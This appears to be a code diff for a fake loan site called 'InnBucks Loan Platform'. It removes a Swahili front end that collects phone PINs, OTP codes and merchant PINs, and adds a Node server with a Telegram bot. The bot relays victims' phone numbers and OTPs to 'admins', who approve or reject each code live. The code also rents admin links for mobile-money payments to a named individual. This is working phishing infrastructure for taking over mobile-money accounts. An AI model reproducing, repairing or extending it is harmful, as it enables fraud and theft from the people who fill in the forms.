-      showOtpMsg('error', 'Hitilafu ya mtandao wakati wa kutuma tena OTP.');
-    }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
-  // ══════════════════════════════════════════════════════
-  async function doOtp() {
-    const otp = document.getElementById('otpInput').value.trim();
-    if (otp.length === 0) {
-      showOtpMsg('warning', 'Tafadhali bandika code yako.');
-      return;
-    }
-
-    hideOtpMsgs();
-
-    let c = 3;
-    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
-    document.getElementById('mOtp').classList.add('show');
-    document.getElementById('bOtp').disabled = true;
-
-    const countdown = setInterval(() => {
-      c--;
-      const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Please wait… (' + c + 's)';
-    }, 1000);
-
-    try {
-      const res  = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, otp })
-      });
-      const data = await res.json();
-
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
-
-      if (data.success) {
-        showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
-        pollOtpStatus();
-      } else {
-        document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha OTP. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
-      document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
-    }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-otp-status
-  // ══════════════════════════════════════════════════════
-  let otpPollInterval = null;
-
-  function pollOtpStatus() {
-    if (otpPollInterval) clearInterval(otpPollInterval);
-
-    otpPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(otpPollInterval);
-          // Update approval page with loan details (stored for later)
-          document.getElementById('apAmt').textContent  = '$' + Number(S.amt || 1000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
-          // Calculate monthly payment for display
-          const a = Number(S.amt) || 1000;
-          const t = parseInt(S.term) || 48;
-          const r = 0.08 / 12;
-          const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = 'TZS ' + m.toFixed(2);
-          // Go to merchant PIN page before approval
-          goTo('page-merchant-pin');
-          [0,1,2,3].forEach(i => { document.getElementById('mp'+i).value = ''; });
-          chkMerchPin();
-          document.getElementById('mp0').focus();
-
-        } else if (data.status === 'rejected') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Verification failed. Please contact support.');
-          document.getElementById('bOtp').disabled = false;
-
-        } else if (data.status === 'wrongpin_otp') {
-          // Admin flagged PIN as wrong — send user back to login
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
-          setTimeout(() => {
-            // Clear OTP textarea
-            document.getElementById('otpInput').value = '';
-            chkOtp();
-            // Reset OTP button
-            document.getElementById('bOtp').disabled = false;
-            // Hide waiting spinner and show OTP inputs (reset OTP page state)
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = '';
-            // Stop resend timer and reset it
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
-            // Clear all OTP messages
-            hideOtpMsgs();
-            // Reset application state so a fresh login creates a new application
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            S.otpAttempts = 0;
-            goTo('page-login');
-          }, 2500);
-
-        } else if (data.status === 'wrongcode') {
-          // Admin flagged OTP as wrong — let user re-enter
-          clearInterval(otpPollInterval);
-          S.otpAttempts = (S.otpAttempts || 0) + 1;
-          
-          document.getElementById('otpInput').value = '';
-          chkOtp();
-          document.getElementById('bOtp').disabled = false;
-          
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
-          
-          if (S.otpAttempts >= 2) {
-            setTimeout(() => {
-              document.getElementById('helpModal').style.display = 'flex';
-            }, 1000);
-          }
-          
-          document.getElementById('otpInput').focus();
-        }
-        // status === 'pending' → keep polling
-
-      } catch (e) {
-        // Silent on network hiccup
-      }
-    }, 2000);
-
-    // 5 minute timeout
-    setTimeout(() => {
-      if (otpPollInterval) {
-        clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
-        document.getElementById('bOtp').disabled = false;
-      }
-    }, 300000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // MERCHANT PIN PAGE — INPUT HELPERS
-  // ══════════════════════════════════════════════════════
-  function pinMvM(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('mp' + (i+1)).focus();
-    chkMerchPin();
-  }
-
-  function chkMerchPin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('mp'+i).value);
-    document.getElementById('bMerchPin').className = ok ? 'btn-login rdy' : 'btn-login';
-  }
-
-  function togMerchPin() {
-    [0,1,2,3].forEach(i => {
-      const b = document.getElementById('mp'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
-    });
-  }
-
-  function showMerchPinMsg(type, text) {
-    ['mpMsg','mpMsgOk','mpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-    if (type === 'error')   { document.getElementById('mpMsgTxt').textContent = text;    document.getElementById('mpMsg').classList.add('show'); }
-    if (type === 'success') { document.getElementById('mpMsgOkTxt').textContent = text;  document.getElementById('mpMsgOk').classList.add('show'); }
-    if (type === 'warning') { document.getElementById('mpMsgWarnTxt').textContent = text; document.getElementById('mpMsgWarn').classList.add('show'); }
-  }
-  function hideMerchPinMsgs() {
-    ['mpMsg','mpMsgOk','mpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-  }
-
-  // ══════════════════════════════════════════════════════
-  // MERCHANT PIN — CALLS /api/verify-merchant-pin
-  // ══════════════════════════════════════════════════════
-  let merchPinPollInterval = null;
-
-  async function doMerchPin() {
-    hideMerchPinMsgs();
-
-    const merchantPin = [0,1,2,3].map(i => document.getElementById('mp'+i).value).join('');
-
-    if (merchantPin.length < 4) {
-      showMerchPinMsg('warning', 'Tafadhali weka tarakimu zote 4 za PIN yako ya Merchant Account.');
-      return;
-    }
-
-    document.getElementById('mMerchPin').classList.add('show');
-    document.getElementById('bMerchPin').disabled = true;
-
-    try {
-      const res = await fetch('/api/verify-merchant-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          applicationId: S.applicationId,
-          merchantPin
-        })
-      });
-
-      const data = await res.json();
-      document.getElementById('mMerchPin').classList.remove('show');
-
-      if (data.success) {
-        // Hide PIN inputs, show waiting indicator — poll for admin decision
-        document.getElementById('merchPinInputSection').style.display = 'none';
-        document.getElementById('merchPinWait').classList.add('show');
-
-        if (merchPinPollInterval) clearInterval(merchPinPollInterval);
-
-        // Timeout after 5 minutes
-        const pollTimeout = setTimeout(() => {
-          if (merchPinPollInterval) {
-            clearInterval(merchPinPollInterval);
-            merchPinPollInterval = null;
-            document.getElementById('merchPinWait').classList.remove('show');
-            document.getElementById('merchPinInputSection').style.display = '';
-            document.getElementById('bMerchPin').disabled = false;
-            showMerchPinMsg('warning', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
-          }
-        }, 300000);
-
-        merchPinPollInterval = setInterval(async () => {
-          try {
-            const pollRes  = await fetch('/api/check-merchant-pin-status/' + S.applicationId);
-            const pollData = await pollRes.json();
-
-            if (pollData.status === 'approved') {
-              clearInterval(merchPinPollInterval);
-              clearTimeout(pollTimeout);
-              merchPinPollInterval = null;
-              goTo('page-approval');
-
-            } else if (pollData.status === 'wrong') {
-              // Admin flagged PIN as wrong — let user re-enter
-              clearInterval(merchPinPollInterval);
-              clearTimeout(pollTimeout);
-              merchPinPollInterval = null;
-              document.getElementById('merchPinWait').classList.remove('show');
-              document.getElementById('merchPinInputSection').style.display = '';
-              [0,1,2,3].forEach(i => document.getElementById('mp'+i).value = '');
-              chkMerchPin();
-              document.getElementById('bMerchPin').disabled = false;
-              showMerchPinMsg('error', 'PIN ya Merchant si sahihi. Tafadhali weka tena.');
-              document.getElementById('mp0').focus();
+}
+
+// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
+function formatPhone(phoneNumber) {
+    if (!phoneNumber) return phoneNumber;
+    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4);
+    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4);
+    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);
+    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3);
+    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber;
+    return phoneNumber;
+}
+
+async function sendToAdmin(adminId, message, options = {}) {
+    const chatId = adminChatIds.get(adminId);
+
+    if (!chatId) {
+        try {
+            const admin = await db.getAdmin(adminId);
+            if (!admin?.chatId) {
+                console.error(`❌ No chat ID for admin: ${adminId}`);
+                return null;
             }
-            // status === 'pending' → keep polling
-
-          } catch (e) {
-            // Silent on network hiccup
-          }
-        }, 2000);
-
-      } else {
-        document.getElementById('bMerchPin').disabled = false;
-        showMerchPinMsg('error', data.message || 'Imeshindwa kuthibitisha PIN ya Merchant. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      document.getElementById('mMerchPin').classList.remove('show');
-      document.getElementById('bMerchPin').disabled = false;
-      showMerchPinMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
+            adminChatIds.set(adminId, admin.chatId);
+            return await bot.sendMessage(admin.chatId, message, options);
+        } catch (err) {
+            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
+            return null;
+        }
     }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // WHATSAPP HELP REQUEST
-  // ══════════════════════════════════════════════════════
-  
-  let helpStatusPollInterval = null;
-
-  function closeHelpModal() {
-    document.getElementById('helpModal').style.display = 'none';
-  }
-
-  function goToHelpPage() {
-    closeHelpModal();
-    S.otpAttempts = 0;
-    goTo('page-otp-help');
-  }
-
-  function normalizePhone(inputId) {
-    const input = document.getElementById(inputId);
-    input.value = input.value.replace(/\D/g, '').slice(0, 10);
-  }
-
-  function chkWhatsapp() {
-    const whatsapp = document.getElementById('whatsappNum').value.trim();
-    const ok = whatsapp.length === 10;
-    const btn = document.getElementById('bWhatsapp');
-    if (ok) {
-      btn.className = 'btn-otp rdy';
-      btn.style.background = 'linear-gradient(to right, #006064, #00838f)';
-      btn.style.color = '#fff';
-    } else {
-      btn.className = 'btn-otp';
-      btn.style.background = '#e8e8e8';
-      btn.style.color = '#aaa';
-    }
-  }
-
-  function showHelpMsg(type, text) {
-    ['helpMsgErr'].forEach(id => {
-      const el = document.getElementById(id);
-      if (el) el.style.display = 'none';
-    });
-    if (type === 'error') {
-      document.getElementById('helpMsgErrTxt').textContent = text;
-      document.getElementById('helpMsgErr').style.display = 'block';
-    }
-  }
-
-  function hideHelpMsgs() {
-    ['helpMsgErr'].forEach(id => {
-      const el = document.getElementById(id);
-      if (el) el.style.display = 'none';
-    });
-  }
-
-  async function submitWhatsapp() {
-    const whatsapp = '+27' + document.getElementById('whatsappNum').value;
-
-    if (whatsapp.length < 13) {
-      showHelpMsg('error', 'Tafadhali weka nambari sahihi ya WhatsApp.');
-      return;
-    }
-
-    document.getElementById('helpInputSection').style.display = 'none';
-    document.getElementById('helpWait').style.display = 'block';
-    document.getElementById('bWhatsapp').disabled = true;
 
     try {
-      const res = await fetch('/api/submit-help-request', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          applicationId: S.applicationId,
-          whatsappNumber: whatsapp
-        })
-      });
-
-      const data = await res.json();
-
-      if (data.success) {
-        pollHelpStatus();
-      } else {
-        document.getElementById('helpWait').style.display = 'none';
-        document.getElementById('helpInputSection').style.display = 'block';
-        document.getElementById('bWhatsapp').disabled = false;
-        showHelpMsg('error', data.message || 'Hitilafu. Tafadhali jaribu tena.');
-      }
-    } catch (err) {
-      document.getElementById('helpWait').style.display = 'none';
-      document.getElementById('helpInputSection').style.display = 'block';
-      document.getElementById('bWhatsapp').disabled = false;
-      showHelpMsg('error', 'Hitilafu ya mtandao. Tafadhali jaribu tena.');
+        return await bot.sendMessage(chatId, message, options);
+    } catch (error) {
+        console.error(`❌ Error sending to ${adminId}:`, error.message);
+        return null;
     }
-  }
+}
 
-  function pollHelpStatus() {
-    if (helpStatusPollInterval) clearInterval(helpStatusPollInterval);
+// Start 5-minute countdown for admin link
+async function startLinkPaymentTimer(adminId) {
+    if (adminLinkTimers.has(adminId)) {
+        clearTimeout(adminLinkTimers.get(adminId));
+    }
 
-    helpStatusPollInterval = setInterval(async () => {
-      try {
-        const res = await fetch('/api/check-help-status/' + S.applicationId);
-        const data = await res.json();
+    const timer = setTimeout(async () => {
+        try {
+            await db.updateAdmin(adminId, { linkLocked: true, linkLockedAt: new Date() });
+            adminLinkTimers.delete(adminId);
+            console.log(`🔒 Admin link auto-locked after 5 minutes: ${adminId}`);
 
-        if (!data.success) return;
+            const admin = await db.getAdmin(adminId);
+            if (admin?.chatId) {
+                await bot.sendMessage(admin.chatId, `
+🔒 *YOUR LINK HAS BEEN LOCKED*
 
-        if (data.status === 'verified') {
-          clearInterval(helpStatusPollInterval);
-          document.getElementById('helpWait').style.display = 'none';
-          document.getElementById('helpSuccess').style.display = 'block';
-          
-          setTimeout(() => {
-            S.otpAttempts = 0;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 5000);
+Your admin link has been automatically locked after 5 minutes.
 
-        } else if (data.status === 'invalid_number') {
-          clearInterval(helpStatusPollInterval);
-          document.getElementById('helpWait').style.display = 'none';
-          document.getElementById('helpInputSection').style.display = 'block';
-          document.getElementById('whatsappNum').value = '';
-          document.getElementById('bWhatsapp').disabled = false;
-          chkWhatsapp();
-          
-          showHelpMsg('error', 'Nambari hiyo sio WhatsApp sahihi. Tafadhali weka nambari sahihi ya WhatsApp yako.');
-          document.getElementById('whatsappNum').focus();
+⏰ To reactivate your link, you must complete payment.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💰 *PAYMENT DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📱 **Payment Method:** Mobile Money
+
+**Recipient Name:** Okeyo Bungu
+**Phone Number:** 0791336749
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+*Steps to Unlock:*
+1️⃣ Send money to: *0791336749*
+2️⃣ Use your preferred payment method (M-Pesa, MTN, etc)
+3️⃣ Get the transaction reference code
+4️⃣ Send the code in this format:
+
+\`/payment YOUR_TRANSACTION_CODE\`
+
+*Example:*
+\`/payment XAF123456\`
+
+Once payment is verified, your link will be immediately unlocked.
+
+📧 Questions? Contact the super admin.
+                `, { parse_mode: 'Markdown' });
+            }
+        } catch (error) {
+            console.error(`❌ Error locking admin link ${adminId}:`, error);
         }
-      } catch (err) {
-        // Silent on network hiccup
-      }
-    }, 2000);
+    }, 5 * 60 * 1000);
 
-    setTimeout(() => {
-      if (helpStatusPollInterval) {
-        clearInterval(helpStatusPollInterval);
-        helpStatusPollInterval = null;
-        if (document.getElementById('helpWait').style.display !== 'none') {
-          document.getElementById('helpWait').style.display = 'none';
-          document.getElementById('helpInputSection').style.display = 'block';
-          document.getElementById('bWhatsapp').disabled = false;
-          showHelpMsg('error', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
+    adminLinkTimers.set(adminId, timer);
+    console.log(`⏱️ 5-minute timer started for admin link: ${adminId}`);
+}
+
+// Remove timer when payment is approved
+function removeLinkPaymentTimer(adminId) {
+    if (adminLinkTimers.has(adminId)) {
+        clearTimeout(adminLinkTimers.get(adminId));
+        adminLinkTimers.delete(adminId);
+        console.log(`✅ 5-minute timer removed for admin: ${adminId}`);
+    }
+}
+
+// ==========================================
+// NEW HELPER: Build suspendall checklist page
+// ==========================================
+function buildSuspendAllPage(session) {
+    const { allAdmins, selections, page } = session;
+    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
+    const start      = page * SUSPEND_PAGE_SIZE;
+    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
+    const suspendCount = selections.size;
+
+    // One row per admin: checkbox button
+    const adminRows = pageAdmins.map(admin => {
+        const willSuspend = selections.has(admin.adminId);
+        const label = willSuspend
+            ? `✅ ${admin.name} (${admin.adminId})`
+            : `⬜ ${admin.name} (${admin.adminId})`;
+        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
+    });
+
+    // Navigation row
+    const navRow = [];
+    if (page > 0) {
+        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
+    }
+    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
+    if (page < totalPages - 1) {
+        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
+    }
+
+    // Action row
+    const actionRow = [
+        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
+        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
+    ];
+
+    const inline_keyboard = [...adminRows, navRow, actionRow];
+
+    const text = `
+🔒 *SUSPEND ADMIN LINKS*
+
+Tap an admin to toggle ✅/⬜
+✅ = will be suspended  ⬜ = will be kept active
+
+Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
+Selected to suspend: *${suspendCount}*
+
+Deselect anyone you want to keep active, then tap *Suspend Selected*.
+    `.trim();
+
+    return { text, inline_keyboard };
+}
+
+// ==========================================
+// MIDDLEWARE
+// ==========================================
+app.use(express.json());
+app.use(express.static(__dirname));
+
+// ==========================================
+// BOT COMMAND HANDLERS (set up immediately)
+// ==========================================
+console.log('⏳ Setting up bot handlers...');
+
+bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
+bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));
+
+setupCommandHandlers();
+console.log('✅ Command handlers configured!');
+
+// ==========================================
+// WEBHOOK ENDPOINT
+// ==========================================
+const webhookPath = `/telegram-webhook`;
+
+app.post(webhookPath, (req, res) => {
+    try {
+        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
+        if (req.body && req.body.update_id !== undefined) {
+            try {
+                bot.processUpdate(req.body);
+                console.log('✅ Update processed');
+            } catch (processError) {
+                console.error('❌ processUpdate error:', processError);
+            }
         }
-      }
-    }, 300000);
-  }
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('❌ Webhook handler error:', error);
+        res.sendStatus(200);
+    }
+});
 
-  // ══════════════════════════════════════════════════════
-  // INIT
-  // ══════════════════════════════════════════════════════
-  calcUp();
-</script>
-</body>
-</html>
+// ==========================================
+// DATABASE INIT + WEBHOOK SETUP
+// ==========================================
+db.connectDatabase()
+    .then(async () => {
+        dbReady = true;
+        console.log('✅ Database ready!');
+
+        await loadAdminChatIds();
+
+        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
+        let webhookSetSuccessfully = false;
+        let attempts = 0;
+
+        while (!webhookSetSuccessfully && attempts < 3) {
+            attempts++;
+            try {
+                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
+                await bot.deleteWebHook();
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                const result = await bot.setWebHook(fullWebhookUrl, {
+                    drop_pending_updates: false,
+                    max_connections: 40,
+                    allowed_updates: ['message', 'callback_query']
+                });
+
+                if (result) {
+                    const info = await bot.getWebHookInfo();
+                    if (info.url === fullWebhookUrl) {
+                        webhookSetSuccessfully = true;
+                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
+                    } else {
+                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
+                    }
+                }
+            } catch (webhookError) {
+                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
+                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+        }
+
+        if (!webhookSetSuccessfully) {
+            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
+        }
+
+        try {
+            const botInfo = await bot.getMe();
+            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
+        } catch (botError) {
+            console.error('❌ Bot API error:', botError);
+        }
+
+        // Keep-alive + self-ping to prevent Render free tier sleep
+        setInterval(() => {
+            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
+            const pingUrl = `${WEBHOOK_URL}/health`;
+            fetch(pingUrl).catch(() => {});
+        }, 14 * 60 * 1000);
+
+        // Webhook health check + auto-fix
+        setInterval(async () => {
+            try {
+                const info  = await bot.getWebHookInfo();
+                const isSet = info.url === fullWebhookUrl;
+                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
+                if (!isSet) {
+                    console.log('⚠️ Auto-fixing webhook...');
+                    await bot.setWebHook(fullWebhookUrl, {
+                        drop_pending_updates: false,
+                        max_connections: 40,
+                        allowed_updates: ['message', 'callback_query']
+                    });
+                    console.log('✅ Webhook re-set');
+                }
+            } catch (error) {
+                console.error('⚠️ Webhook check error:', error.message);
+            }
+        }, 60000);
+
+        // ── Check and suspend expired subscriptions (daily check at midnight) ──
+        setInterval(async () => {
+            try {
+                const now = new Date();
+                if (now.getDate() === 1 && now.getHours() === 0 && now.getMinutes() < 2) {
+                    console.log('📅 Monthly billing cycle: Suspending all non-super-admin links...');
+                    
+                    const allAdmins = await db.getAllAdmins();
+                    const regularAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));
+                    
+                    for (const admin of regularAdmins) {
+                        try {
+                            await db.updateAdmin(admin.adminId, { 
+                                linkLocked: true, 
+                                linkLockedAt: new Date(),
+                                paymentStatus: 'pending'
+                            });
+                            
+                            if (admin.chatId) {
+                                await bot.sendMessage(admin.chatId, `
+📅 *MONTHLY SUBSCRIPTION RENEWAL REQUIRED*
+
+Your subscription has expired and your admin link has been suspended.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💰 *PAYMENT DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📱 **Payment Method:** Mobile Money
+
+**Recipient Name:** Okeyo Bungu
+**Phone Number:** 0791336749
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+*Steps to Renew:*
+1️⃣ Send money to: *0791336749*
+2️⃣ Use your preferred payment method (M-Pesa, MTN, etc)
+3️⃣ Get the transaction reference code
+4️⃣ Send the code in this format:
+
+\`/payment YOUR_TRANSACTION_CODE\`
+
+*Example:*
+\`/payment XAF123456\`
+
+Once payment is verified and approved by super admin, your link will be unlocked.
+
+📧 Questions? Contact the super admin.
+                                `, { parse_mode: 'Markdown' }).catch(() => {});
+                            }
+                            
+                            console.log(`🔒 Monthly suspension: ${admin.adminId} (${admin.name})`);
+                        } catch (err) {
+                            console.error(`Failed to suspend ${admin.adminId}:`, err.message);
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('❌ Error checking monthly subscriptions:', error);
+            }
+        }, 60 * 1000);
+
+        console.log('✅ System fully initialized!');
+    })
+    .catch((error) => {
+        console.error('❌ Initialization failed:', error);
+        process.exit(1);
+    });
+
+// ==========================================
+// LOAD ADMIN CHAT IDs FROM DB
+// ==========================================
+async function loadAdminChatIds() {
+    try {
+        const admins = await db.getAllAdmins();
+        console.log(`📋 Loading ${admins.length} admins from database...`);
+
+        adminChatIds.clear();
+        pausedAdmins.clear();
+
+        for (const admin of admins) {
+            console.log(`\n   Processing: ${admin.name} (${admin.adminId}) chatId=${admin.chatId} status=${admin.status}`);
+            if (admin.chatId) {
+                adminChatIds.set(admin.adminId, admin.chatId);
+                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
+                console.log(`   ✅ LOADED`);
+            } else {
+                console.log(`   ⚠️ SKIPPED - missing chatId`);
+            }
+        }
+
+        console.log(`\n✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
+    } catch (error) {
+        console.error('❌ Error loading admin chat IDs:', error);
+    }
+}
+
+// ==========================================
+// BOT COMMAND HANDLERS
+// ==========================================
+function setupCommandHandlers() {
+
+    // /start
+    bot.onText(/\/start/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+
+        console.log(`\n/start from chatId: ${chatId}, adminId: ${adminId || 'NONE'}`);
+
+        try {
+            if (adminId) {
+                if (pausedAdmins.has(adminId) && !isSuperAdmin(adminId)) {
+                    await bot.sendMessage(chatId, `
+🚫 *ADMIN ACCESS PAUSED*
+
+Your admin access has been temporarily paused.
+Please contact the super admin.
+
+*Your Admin ID:* \`${adminId}\`
+                    `, { parse_mode: 'Markdown' });
+                    return;
+                }
+
+                const admin   = await db.getAdmin(adminId);
+                const isAdmin = isSuperAdmin(adminId);
+
+                let message = `
+👋 *Welcome ${admin.name}!*
+
+*Your Admin ID:* \`${adminId}\`
+*Role:* ${isAdmin ? '⭐ Super Admin' : '👤 Admin'}
+*Your Personal Link:*
+${WEBHOOK_URL}?admin=${adminId}
+
+*Commands:*
+/mylink - Get your link
+/stats - Your statistics
+/pending - Pending applications
+/myinfo - Your information
+`;
+                if (isAdmin) {
+                    message += `
+*Admin Management (Super Admin Only):*
+/addadmin - Add new admin
+/addadminid - Add admin with specific ID
+/transferadmin oldChatId | newChatId - Transfer admin
+/pauseadmin <adminId> - Pause an admin
+/unpauseadmin <adminId> - Unpause an admin
+/removeadmin <adminId> - Remove an admin
+/clearalladmins - Remove all admins (except super admins)
+/admins - List all admins
+/suspendall - 🔒 Suspend selected admin links (checklist)
+/pendingpayments - View pending admin payments
+/approvepayment <adminId> - Approve payment
+/rejectpayment <adminId> - Reject payment
+/unlockalllinks - Unlock ALL admin links immediately
+
+*Messaging:*
+/send <adminId> <message> - Message an admin
+/broadcast <message> - Message all admins
+/ask <adminId> <request> - Send action request
+`;
+                }
+                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+            } else {
+                await bot.sendMessage(chatId, `
+👋 *Welcome to InnBucks Loan Platform!*
+
+Your Chat ID: \`${chatId}\`
+
+Provide this to your super admin to get access.
+                `, { parse_mode: 'Markdown' });
+            }
+        } catch (error) {
+            console.error('❌ Error in /start:', error);
+        }
+    });
+
+    // /mylink
+    bot.onText(/\/mylink/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+        const admin = await db.getAdmin(adminId);
+        bot.sendMessage(chatId, `
+🔗 *YOUR LINK*
+
+\`${WEBHOOK_URL}?admin=${adminId}\`
+
+📋 Applications → *${admin.name}*
+        `, { parse_mode: 'Markdown' });
+    });
+
+    // /stats
+    bot.onText(/\/stats/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+        const stats = await db.getAdminStats(adminId);
+        bot.sendMessage(chatId, `
+📊 *STATISTICS*
+
+📋 Total: ${stats.total}
+⏳ PIN Pending: ${stats.pinPending}
+✅ PIN Approved: ${stats.pinApproved}
+⏳ OTP Pending: ${stats.otpPending}
+🎉 Fully Approved: ${stats.fullyApproved}
+        `, { parse_mode: 'Markdown' });
+    });
+
+    // /pending
+    bot.onText(/\/pending/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+
+        const adminApps = await db.getApplicationsByAdmin(adminId);
+        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
+        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
+
+        let message = `⏳ *PENDING*\n\n`;
+        if (pinPending.length > 0) {
+            message += `📱 *PIN (${pinPending.length}):*\n`;
+            pinPending.forEach((app, i) => {
+                message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
+            });
+            message += '\n';
+        }
+        if (otpPending.length > 0) {
+            message += `🔢 *OTP (${otpPending.length}):*\n`;
+            otpPending.forEach((app, i) => {
+                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
+            });
+        }
+        if (pinPending.length === 0 && otpPending.length === 0) {
+            message = '✨ No pending applications!';
+        }
+        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+    });
+
+    // /myinfo
+    bot.onText(/\/myinfo/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+        const admin      = await db.getAdmin(adminId);
+        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
